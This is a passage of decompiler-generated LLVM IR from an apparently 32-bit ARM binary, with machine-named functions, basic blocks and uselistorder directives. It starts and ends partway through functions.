  %v3_16ea8 = inttoptr i32 %v2_16ea8 to i32*
  %v4_16ea8 = load i32, i32* %v3_16ea8, align 4
  store i32 %v4_16ea8, i32* %r3.global-to-local, align 4
  %v2_16eac = icmp eq i32 %v4_16ea8, 0
  br i1 %v2_16eac, label %dec_label_pc_16eb4, label %dec_label_pc_16ef0

dec_label_pc_16eb4:                               ; preds = %dec_label_pc_16ea4
  %v1_16eb8 = call i32 @function_fd60(i32 28)
  store i32 -32856, i32* %r3.global-to-local, align 4
  store i32 12316, i32* %r2.global-to-local, align 4
  %v2_16ec4 = icmp eq i32 %v1_16eb8, 0
  br i1 %v2_16ec4, label %.thread8.thread, label %bb71

.thread8.thread:                                  ; preds = %dec_label_pc_16eb4
  store i32 ptrtoint (i32* @global_var_1aa84.695 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1aa84.695 to i32), i32* @global_var_25af8.661, align 4
  br label %.thread10

bb71:                                             ; preds = %dec_label_pc_16eb4
  store i32 %v1_16eb8, i32* @global_var_25af8.661, align 4
  %v1_16ed412 = load i32, i32* @r5, align 4
  %v3_16ed414 = add i32 %v1_16ed412, -32856
  store i32 %v3_16ed414, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8.thread, %bb71
  store i32 93920, i32* @lr, align 4
  %v1_16edc = xor i1 %v2_16ec4, true
  call void @__pseudo_cond_branch(i1 %v1_16edc, i32 ptrtoint (i32* @global_var_f350.391 to i32))
  store i32 12320, i32* %r2.global-to-local, align 4
  %v0_16ee4 = load i32, i32* @r5, align 4
  %v2_16ee4 = add i32 %v0_16ee4, 12320
  %v3_16ee4 = inttoptr i32 %v2_16ee4 to i32*
  %v4_16ee4 = load i32, i32* %v3_16ee4, align 4
  %v1_16ee8 = add i32 %v4_16ee4, 1
  store i32 %v1_16ee8, i32* %r3.global-to-local, align 4
  store i32 %v1_16ee8, i32* %v3_16ee4, align 4
  %v0_16ef4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16ef0

dec_label_pc_16ef0:                               ; preds = %dec_label_pc_16ea4, %.thread10
  %v0_16ef4 = phi i32 [ %v0_16ea8, %dec_label_pc_16ea4 ], [ %v0_16ef4.pre, %.thread10 ]
  store i32 12324, i32* @r7, align 4
  %v2_16ef4 = add i32 %v0_16ef4, 12324
  %v3_16ef4 = inttoptr i32 %v2_16ef4 to i32*
  %v4_16ef4 = load i32, i32* %v3_16ef4, align 4
  store i32 %v4_16ef4, i32* @r4, align 4
  %v2_16ef8 = icmp eq i32 %v4_16ef4, 0
  br i1 %v2_16ef8, label %dec_label_pc_16f00, label %dec_label_pc_16f80

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16ef0
  %v2_16f00 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_16f00, i32* @r6, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_16f0c = call i32 @function_17430(i32 %v2_16f00, i32 255)
  %v2_16f10 = icmp eq i32 %v2_16f0c, 0
  br i1 %v2_16f10, label %dec_label_pc_16f1c, label %dec_label_pc_16f80

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16f00
  store i32 %v2_16f00, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_16f24 = call i32 @function_14918(i32 %v2_16f00, i32 46)
  %v2_16f28 = icmp eq i32 %v2_16f24, 0
  br i1 %v2_16f28, label %dec_label_pc_16f80, label %dec_label_pc_16f30

dec_label_pc_16f30:                               ; preds = %dec_label_pc_16f1c
  %v1_16f30 = add i32 %v2_16f24, 1
  %v2_16f30 = inttoptr i32 %v1_16f30 to i8*
  %v3_16f30 = load i8, i8* %v2_16f30, align 1
  %v4_16f30 = zext i8 %v3_16f30 to i32
  store i32 %v4_16f30, i32* %r3.global-to-local, align 4
  %v2_16f34 = icmp eq i8 %v3_16f30, 0
  br i1 %v2_16f34, label %dec_label_pc_16f80, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f30
  %v1_16f40 = call i32 @function_f7d0(i32 %v1_16f30)
  store i32 %v1_16f40, i32* @r4, align 4
  %v2_16f44 = icmp eq i32 %v1_16f40, 0
  br i1 %v2_16f44, label %dec_label_pc_16f80, label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %dec_label_pc_16f40
  %v1_16f50 = call i32 @function_fd60(i32 4)
  store i32 12312, i32* %r3.global-to-local, align 4
  %v2_16f58 = icmp eq i32 %v1_16f50, 0
  store i32 %v1_16f50, i32* @global_var_25af4.657, align 4
  br i1 %v2_16f58, label %dec_label_pc_16f64, label %dec_label_pc_16f70

dec_label_pc_16f64:                               ; preds = %dec_label_pc_16f4c
  %v0_16f64 = load i32, i32* @r4, align 4
  store i32 %v0_16f64, i32* @r0, align 4
  %v0_16f68 = call i32 @function_108e4()
  br label %dec_label_pc_16f80

dec_label_pc_16f70:                               ; preds = %dec_label_pc_16f4c
  %v0_16f70 = load i32, i32* @r5, align 4
  %v1_16f70 = load i32, i32* @r7, align 4
  %v2_16f70 = add i32 %v1_16f70, %v0_16f70
  %v3_16f70 = inttoptr i32 %v2_16f70 to i32*
  %v4_16f70 = load i32, i32* %v3_16f70, align 4
  %v1_16f74 = add i32 %v4_16f70, 1
  store i32 %v1_16f74, i32* %r3.global-to-local, align 4
  %v0_16f78 = load i32, i32* @r4, align 4
  %v2_16f78 = inttoptr i32 %v1_16f50 to i32*
  store i32 %v0_16f78, i32* %v2_16f78, align 4
  %v0_16f7c = load i32, i32* %r3.global-to-local, align 4
  %v1_16f7c = load i32, i32* @r5, align 4
  %v2_16f7c = load i32, i32* @r7, align 4
  %v3_16f7c = add i32 %v2_16f7c, %v1_16f7c
  %v4_16f7c = inttoptr i32 %v3_16f7c to i32*
  store i32 %v0_16f7c, i32* %v4_16f7c, align 4
  br label %dec_label_pc_16f80

dec_label_pc_16f80:                               ; preds = %dec_label_pc_16f00, %dec_label_pc_16ef0, %dec_label_pc_16bdc, %dec_label_pc_16f40, %dec_label_pc_16f30, %dec_label_pc_16f1c, %dec_label_pc_16f64, %dec_label_pc_16f70
  store i32 12308, i32* %r3.global-to-local, align 4
  %v4_16f84 = load i32, i32* @global_var_25af0.671, align 4
  %v2_16f88 = icmp eq i32 %v4_16f84, 0
  br i1 %v2_16f88, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_16f80
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_16f80, %bb72
  %v2_16f90 = xor i1 %v2_16f88, true
  call void @__pseudo_cond_branch(i1 %v2_16f90, i32 %v4_16f84)
  store i32 %v3_16b8c, i32* %r4.global-to-local, align 4
  store i32 %v15_16b8c, i32* @r8, align 4
  store i32 %v18_16b8c, i32* @sb, align 4
  store i32 %v21_16b8c, i32* @sl, align 4
  store i32 %v24_16b8c, i32* @fp, align 4
  ret i32 %v4_16f84

dec_label_pc_16fe8:                               ; preds = %dec_label_pc_16bac
  store i32 %.v1_16bc0, i32* %v3_16bcc, align 4
  %v3_16fe8 = load i32, i32* @r4, align 4
  store i32 12316, i32* %r4.global-to-local, align 4
  store i32 142044, i32* @r5, align 4
  %v4_16ffc = load i32, i32* @global_var_25af8.661, align 4
  store i32 ptrtoint (i32* @global_var_1aa84.695 to i32), i32* %r3.global-to-local, align 4
  store i32 94224, i32* @lr, align 4
  %v1_1700c = icmp ne i32 %v4_16ffc, ptrtoint (i32* @global_var_1aa84.695 to i32)
  call void @__pseudo_cond_branch(i1 %v1_1700c, i32 ptrtoint (i32* @global_var_108e4.259 to i32))
  store i32 12320, i32* %r3.global-to-local, align 4
  store i32 12324, i32* @r7, align 4
  store i32 12312, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_17020 = load i32, i32* @r5, align 4
  %v3_17020 = add i32 %v1_17020, 12320
  %v4_17020 = inttoptr i32 %v3_17020 to i32*
  store i32 0, i32* %v4_17020, align 4
  %v0_17024 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17024, i32* @global_var_25af8.661, align 4
  br label %dec_label_pc_1703c

dec_label_pc_1702c:                               ; preds = %dec_label_pc_1703c
  store i32 %v4_17050, i32* %r3.global-to-local, align 4
  store i32 %v1_17044, i32* %v3_1703c, align 4
  %v0_17034 = load i32, i32* %r3.global-to-local, align 4
  %v1_17034 = load i32, i32* %r2.global-to-local, align 4
  %v4_17034 = mul i32 %v1_17034, 4
  %v5_17034 = add i32 %v4_17034, %v0_17034
  %v6_17034 = inttoptr i32 %v5_17034 to i32*
  %v7_17034 = load i32, i32* %v6_17034, align 4
  store i32 %v7_17034, i32* @r0, align 4
  %v0_17038 = call i32 @function_108e4()
  br label %dec_label_pc_1703c

dec_label_pc_1703c:                               ; preds = %dec_label_pc_16fe8, %dec_label_pc_1702c
  %v0_1703c = load i32, i32* @r5, align 4
  %v1_1703c = load i32, i32* @r7, align 4
  %v2_1703c = add i32 %v1_1703c, %v0_1703c
  %v3_1703c = inttoptr i32 %v2_1703c to i32*
  %v4_1703c = load i32, i32* %v3_1703c, align 4
  store i32 %v4_1703c, i32* @r4, align 4
  %v2_17040 = icmp eq i32 %v4_1703c, 0
  %v1_17044 = add i32 %v4_1703c, -1
  store i32 %v1_17044, i32* %r2.global-to-local, align 4
  %v0_17048 = load i32, i32* @r6, align 4
  store i32 %v0_17048, i32* %r3.global-to-local, align 4
  %v4_17050 = load i32, i32* @global_var_25af4.657, align 4
  br i1 %v2_17040, label %dec_label_pc_17050, label %dec_label_pc_1702c

dec_label_pc_17050:                               ; preds = %dec_label_pc_1703c
  store i32 %v4_17050, i32* @r0, align 4
  %v0_17054 = call i32 @function_108e4()
  %v0_17058 = load i32, i32* @r4, align 4
  store i32 %v0_17058, i32* @global_var_25af4.657, align 4
  store i32 %v3_16fe8, i32* %r4.global-to-local, align 4
  ret i32 %v0_17054

; uselistorder directives
  uselistorder i32 %v1_17044, { 1, 0 }
  uselistorder i32* %v3_1703c, { 1, 0 }
  uselistorder i32 %v1_16f50, { 1, 0, 2 }
  uselistorder i32 %v2_16f00, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16c90, { 1, 0 }
  uselistorder i32 %v2_16c78, { 1, 0 }
  uselistorder i32 %v2_16e80, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16de0, { 1, 0, 2 }
  uselistorder i32 %v1_16d5823, { 1, 0 }
  uselistorder i32 %v1_16d5016, { 1, 0 }
  uselistorder i32 %v0_16d5015, { 1, 0 }
  uselistorder i32 %v1_16d58, { 1, 0 }
  uselistorder i32 %v4_16ce4, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v3_16cd4, { 1, 0, 2, 3 }
  uselistorder i8** %stack_var_-560, { 1, 0 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 25, 0, 16, 17, 18, 31, 21, 19, 20, 22, 23, 24, 26, 27, 28, 29, 30 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 0, 8, 20, 9, 19, 16, 10, 11, 12, 13, 14, 15, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 17, 16, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_1aa84.695 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_fd60, { 12, 11, 6, 5, 10, 9, 8, 13, 14, 19, 3, 7, 0, 1, 17, 18, 16, 15, 2, 4 }
  uselistorder i32 (i16*)* @function_ce24, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 12324, { 2, 1, 4, 3, 0 }
  uselistorder i32 (i32)* @function_11290, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 1, 4, 3, 5, 2, 0 }
  uselistorder i32 (i32)* @function_f7d0, { 2, 1, 0, 4, 3 }
  uselistorder i32 12312, { 2, 5, 3, 4, 0, 1, 6 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1aa60.690 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1aa58.688 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ea64, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32*, i32)* @function_14f14, { 1, 2, 0 }
  uselistorder i32* @global_var_25af8.661, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 12316, { 0, 2, 1 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_f240, { 10, 11, 12, 0, 13, 9, 8, 14, 19, 6, 7, 26, 25, 22, 20, 1, 16, 17, 18, 2, 3, 4, 5, 15, 21, 23, 24 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_1aa4c.686 to i32), { 1, 0 }
  uselistorder i32 ()* @function_16ae0, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_16b34, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_cfd8, { 2, 3, 1, 0 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1a378.580 to i32), { 0, 2, 1, 3 }
  uselistorder i32 935, { 0, 3, 4, 2, 1 }
  uselistorder i32 12320, { 0, 5, 2, 7, 3, 8, 1, 6, 4, 9, 10, 12, 11, 13 }
  uselistorder i32 ptrtoint ([17 x i8]* @global_var_1aa38.673 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1703c, { 1, 0 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_16f80, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_16ef0, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_16ea4, { 1, 0 }
  uselistorder label %dec_label_pc_16e9c, { 1, 0 }
  uselistorder label %dec_label_pc_16d60, { 1, 0 }
  uselistorder label %dec_label_pc_16e80.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
}

define i32 @function_17080(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_17080:
  %v0_17080 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_170bc = call i32 @function_177e0()
  store i32 %v0_17080, i32* @lr, align 4
  ret i32 %v0_170bc
}

define i32 @function_170cc() local_unnamed_addr {
dec_label_pc_170cc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_170d4 = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_170e0 = load i32, i32* @r0, align 4
  store i32 %v0_170e0, i32* @sl, align 4
  %v2_170e0 = icmp eq i32 %v0_170e0, 0
  %v2_170e4 = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_170e4, align 4
  %v0_170e8 = load i32, i32* @r1, align 4
  store i32 %v0_170e8, i32* @r7, align 4
  %v0_170ec = load i32, i32* @r3, align 4
  store i32 %v0_170ec, i32* @r6, align 4
  br i1 %v2_170e0, label %bb, label %dec_label_pc_170f8

bb:                                               ; preds = %dec_label_pc_170cc
  %v1_170f0 = load i32, i32* @r5, align 4
  %v2_170f0 = add i32 %v1_170f0, 22
  store i32 %v2_170f0, i32* @r5, align 4
  br label %dec_label_pc_173b4

dec_label_pc_170f8:                               ; preds = %dec_label_pc_170cc
  %v0_170f8 = call i32 @function_ce08()
  store i32 %v0_170f8, i32* %r0.global-to-local, align 4
  %v3_170fc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_170fc, i32* %ip.global-to-local, align 4
  %v1_17100 = inttoptr i32 %v0_170f8 to i32*
  %v2_17100 = load i32, i32* %v1_17100, align 4
  store i32 %v2_17100, i32* @r8, align 4
  %v0_17104 = load i32, i32* @r5, align 4
  store i32 %v0_17104, i32* %v1_17100, align 4
  %v0_17108 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_170f8, i32* @r4, align 4
  %v0_17118 = load i32, i32* @sl, align 4
  store i32 %v0_17118, i32* %r0.global-to-local, align 4
  %v0_1711c = load i32, i32* @r7, align 4
  store i32 %v0_1711c, i32* %r2.global-to-local, align 4
  store i32 %v0_170d4, i32* %r3.global-to-local, align 4
  %v0_17124 = load i32, i32* @r6, align 4
  %v7_1712c = call i32 @function_17080(i32 %v0_17118, i32 2, i32 %v0_1711c, i32 %v0_170d4, i32 %v0_17124, i32 %v0_17108, i32 %tmp18)
  store i32 %v7_1712c, i32* %r0.global-to-local, align 4
  store i32 %v7_1712c, i32* @r5, align 4
  %v2_17130 = icmp eq i32 %v7_1712c, 0
  br i1 %v2_17130, label %bb34, label %dec_label_pc_1713c

bb34:                                             ; preds = %dec_label_pc_170f8
  %v1_17134 = load i32, i32* @r8, align 4
  %v2_17134 = load i32, i32* @r4, align 4
  %v3_17134 = inttoptr i32 %v2_17134 to i32*
  store i32 %v1_17134, i32* %v3_17134, align 4
  br label %dec_label_pc_173b4

dec_label_pc_1713c:                               ; preds = %dec_label_pc_170f8
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_17140 = inttoptr i32 %tmp18 to i32*
  %v2_17140 = load i32, i32* %v1_17140, align 4
  store i32 %v2_17140, i32* %r3.global-to-local, align 4
  %v7_17144 = icmp eq i32 %v2_17140, 1
  br i1 %v7_17144, label %dec_label_pc_17160, label %dec_label_pc_1714c

dec_label_pc_1714c:                               ; preds = %dec_label_pc_1713c
  %v7_1714c = icmp eq i32 %v2_17140, 4
  br i1 %v7_1714c, label %dec_label_pc_17180, label %dec_label_pc_17154

dec_label_pc_17154:                               ; preds = %dec_label_pc_1714c
  %v3_17154 = icmp eq i32 %v2_17140, -1
  br i1 %v3_17154, label %dec_label_pc_17174, label %dec_label_pc_173b4

dec_label_pc_17160:                               ; preds = %dec_label_pc_1713c
  %v7_17160 = icmp eq i32 %v7_1712c, 2
  br i1 %v7_17160, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_17160
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17188

.thread4:                                         ; preds = %dec_label_pc_17160
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_17188

dec_label_pc_17174:                               ; preds = %dec_label_pc_17154
  %v0_17174 = load i32, i32* @r4, align 4
  %v1_17174 = inttoptr i32 %v0_17174 to i32*
  %v2_17174 = load i32, i32* %v1_17174, align 4
  store i32 %v2_17174, i32* %r3.global-to-local, align 4
  %v7_17178 = icmp eq i32 %v2_17174, 2
  br i1 %v7_17178, label %dec_label_pc_17180, label %dec_label_pc_173b4

dec_label_pc_17180:                               ; preds = %dec_label_pc_17174, %dec_label_pc_1714c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17188

dec_label_pc_17188:                               ; preds = %.thread4, %bb35, %dec_label_pc_17180
  %storemerge2 = phi i32 [ 0, %dec_label_pc_17180 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_17190 = load i32, i32* @r8, align 4
  %v1_17190 = load i32, i32* @r4, align 4
  %v2_17190 = inttoptr i32 %v1_17190 to i32*
  store i32 %v0_17190, i32* %v2_17190, align 4
  %v0_17194 = load i32, i32* @sl, align 4
  store i32 %v0_17194, i32* @r0, align 4
  %v0_17198 = load i32, i32* %r3.global-to-local, align 4
  %v1_17198 = load i32, i32* @ip, align 4
  %v2_17198 = inttoptr i32 %v1_17198 to i32*
  store i32 %v0_17198, i32* %v2_17198, align 4
  %v0_1719c = call i32 @function_f2e0()
  store i32 %v0_1719c, i32* %r0.global-to-local, align 4
  %v1_171a0 = add i32 %v0_1719c, 1
  store i32 %v1_171a0, i32* @r4, align 4
  %v0_171a4 = load i32, i32* @r6, align 4
  %v7_171a8 = icmp sgt i32 %v0_171a4, %v1_171a0
  br i1 %v7_171a8, label %dec_label_pc_171ac, label %dec_label_pc_173b0

dec_label_pc_171ac:                               ; preds = %dec_label_pc_17188
  %v0_171ac = load i32, i32* @sl, align 4
  store i32 %v0_171ac, i32* @r1, align 4
  store i32 %v1_171a0, i32* @r2, align 4
  store i32 %v0_170d4, i32* @r0, align 4
  %v0_171b8 = call i32 @function_f350()
  store i32 %v0_171b8, i32* %r0.global-to-local, align 4
  %v1_171c0 = load i32, i32* @r4, align 4
  %v2_171c0 = add i32 %v1_171c0, %v0_170d4
  %v1_171c4 = sub i32 0, %v2_171c0
  %v1_171c8 = load i32, i32* @r6, align 4
  %v2_171c8 = sub i32 %v1_171c8, %v1_171c0
  store i32 %v2_171c8, i32* %r2.global-to-local, align 4
  %v1_171cc = urem i32 %v1_171c4, 4
  store i32 %v1_171cc, i32* %r3.global-to-local, align 4
  %v2_171d0 = sub i32 %v2_171c8, %v1_171cc
  store i32 %v2_171d0, i32* @sb, align 4
  %v1_171d4 = add i32 %v2_171d0, -8
  store i32 %v1_171d4, i32* @r5, align 4
  %v7_171dc = icmp slt i32 %v1_171d4, 256
  br i1 %v7_171dc, label %dec_label_pc_173b0, label %dec_label_pc_171e0

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171ac
  %v2_171e0 = add i32 %v1_171cc, %v2_171c0
  store i32 %v2_171e0, i32* @fp, align 4
  store i32 %v0_170d4, i32* %ip.global-to-local, align 4
  %v1_171e8 = add i32 %v2_171e0, 8
  store i32 %v1_171e8, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_171f0 = add i32 %v2_171e0, 16
  store i32 %v1_171f0, i32* @r8, align 4
  %v4_171f4 = inttoptr i32 %v2_171e0 to i32*
  store i32 %v0_170d4, i32* %v4_171f4, align 4
  %v0_171f8 = load i32, i32* @sl, align 4
  store i32 %v0_171f8, i32* %r0.global-to-local, align 4
  %v0_171fc = load i32, i32* @r4, align 4
  %v1_171fc = load i32, i32* @fp, align 4
  %v2_171fc = add i32 %v1_171fc, 4
  %v3_171fc = inttoptr i32 %v2_171fc to i32*
  store i32 %v0_171fc, i32* %v3_171fc, align 4
  %v0_17200 = load i32, i32* @r8, align 4
  %v2_17204 = inttoptr i32 %v0_171f8 to i8*
  %v3_17204 = call i32 @function_14a48(i8* %v2_17204, i32 %v0_17200)
  store i32 %v3_17204, i32* %r0.global-to-local, align 4
  %v1_17208 = load i32, i32* @r4, align 4
  %v9_17208 = icmp eq i32 %v3_17204, %v1_17208
  br i1 %v9_17208, label %dec_label_pc_1724c, label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %dec_label_pc_171e0
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_17214 = load i32, i32* @r7, align 4
  %v2_17214 = add i32 %v1_17214, 8
  %v3_17214 = inttoptr i32 %v2_17214 to i32*
  store i32 2, i32* %v3_17214, align 4
  %v0_17218 = load i32, i32* %r3.global-to-local, align 4
  %v2_17218 = mul i32 %v0_17218, 2
  %v1_1721c = load i32, i32* @r7, align 4
  %v2_1721c = add i32 %v1_1721c, 12
  %v3_1721c = inttoptr i32 %v2_1721c to i32*
  store i32 %v2_17218, i32* %v3_1721c, align 4
  %v3_17220 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_17220, i32* %r2.global-to-local, align 4
  store i32 %v0_170d4, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1722c = load i32, i32* @r4, align 4
  store i32 %v0_1722c, i32* @r5, align 4
  %v0_17230 = load i32, i32* @r8, align 4
  %v1_17230 = load i32, i32* @fp, align 4
  %v2_17230 = add i32 %v1_17230, 8
  %v3_17230 = inttoptr i32 %v2_17230 to i32*
  store i32 %v0_17230, i32* %v3_17230, align 4
  %v0_17234 = load i32, i32* @r7, align 4
  %v1_17234 = load i32, i32* %r2.global-to-local, align 4
  %v2_17234 = inttoptr i32 %v1_17234 to i32*
  store i32 %v0_17234, i32* %v2_17234, align 4
  %v0_17238 = load i32, i32* @r7, align 4
  %v1_17238 = inttoptr i32 %v0_17238 to i32*
  %v2_17238 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_17238, i32* %v1_17238, align 4
  %v3_17238 = add i32 %v0_17238, 4
  %v4_17238 = inttoptr i32 %v3_17238 to i32*
  %v5_17238 = load i32, i32* @fp, align 4
  store i32 %v5_17238, i32* %v4_17238, align 4
  %v0_1723c = load i32, i32* @r6, align 4
  %v1_1723c = load i32, i32* @r7, align 4
  %v2_1723c = add i32 %v1_1723c, 16
  %v3_1723c = inttoptr i32 %v2_1723c to i32*
  store i32 %v0_1723c, i32* %v3_1723c, align 4
  %v0_17240 = load i32, i32* @r4, align 4
  %v1_17240 = load i32, i32* @ip, align 4
  %v2_17240 = inttoptr i32 %v1_17240 to i32*
  store i32 %v0_17240, i32* %v2_17240, align 4
  %v0_17244 = load i32, i32* @r4, align 4
  %v1_17244 = load i32, i32* @r6, align 4
  %v2_17244 = add i32 %v1_17244, 4
  %v3_17244 = inttoptr i32 %v2_17244 to i32*
  store i32 %v0_17244, i32* %v3_17244, align 4
  br label %dec_label_pc_173b4

dec_label_pc_1724c:                               ; preds = %dec_label_pc_171e0
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_17250 = icmp eq i32 %storemerge2, 0
  br i1 %v2_17250, label %dec_label_pc_17268, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1724c
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_17140, align 4
  br label %dec_label_pc_173b4

dec_label_pc_17268:                               ; preds = %dec_label_pc_1724c
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_17274 = load i32, i32* @sl, align 4
  store i32 %v0_17274, i32* %r0.global-to-local, align 4
  %v2_1727c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1727c, i32* %r2.global-to-local, align 4
  %v2_17280 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_17280, i32* %r3.global-to-local, align 4
  %v7_1728c = inttoptr i32 %v0_17274 to i8*
  %v8_1728c = call i32 @function_162f8(i8* %v7_1728c, i32 1, i32 %v2_1727c, i32 %v2_17280)
  store i32 %v8_1728c, i32* %r0.global-to-local, align 4
  %v1_17290 = icmp slt i32 %v8_1728c, 0
  br i1 %v1_17290, label %.thread, label %dec_label_pc_172a8

.thread:                                          ; preds = %dec_label_pc_17268
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_17140, align 4
  br label %dec_label_pc_173b4

dec_label_pc_172a8:                               ; preds = %dec_label_pc_17268
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_172ac = icmp eq i32 %tmp12, 1
  br i1 %v7_172ac, label %dec_label_pc_172b4, label %dec_label_pc_1738c

dec_label_pc_172b4:                               ; preds = %dec_label_pc_172a8
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_172cc = load i32, i32* @r5, align 4
  %v2_172cc = add i32 %v0_172cc, -12
  store i32 %v2_172cc, i32* @r8, align 4
  %v8_172cc = icmp slt i32 %v2_172cc, 0
  br i1 %v8_172cc, label %bb37, label %dec_label_pc_172d8

bb37:                                             ; preds = %dec_label_pc_172b4
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1739c

dec_label_pc_172d8:                               ; preds = %dec_label_pc_172b4
  %v0_172d8 = load i32, i32* @r6, align 4
  store i32 %v0_172d8, i32* @r1, align 4
  %v2_172dc = add i32 %v0_172d8, 12
  store i32 %v2_172dc, i32* @r0, align 4
  %v2_172e0 = call i32 @function_175a0(i32 %v2_172dc, i32 %v0_172d8)
  %v0_172e4 = load i32, i32* @fp, align 4
  %v1_172e4 = add i32 %v0_172e4, 4
  store i32 %v1_172e4, i32* @r3, align 4
  %v1_172e8 = load i32, i32* @r4, align 4
  %v2_172e8 = add i32 %v1_172e8, %v1_172e4
  store i32 %v2_172e8, i32* @r5, align 4
  store i32 %v2_172e8, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_172f8 = call i32 @function_f350()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17304.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17304

dec_label_pc_17304:                               ; preds = %dec_label_pc_17304, %dec_label_pc_172d8
  %v0_17304 = phi i32 [ %v0_17304.pre, %dec_label_pc_172d8 ], [ %v1_17308, %dec_label_pc_17304 ]
  %v1_17304 = load i32, i32* @r6, align 4
  %v7_17304 = inttoptr i32 %v1_17304 to i32*
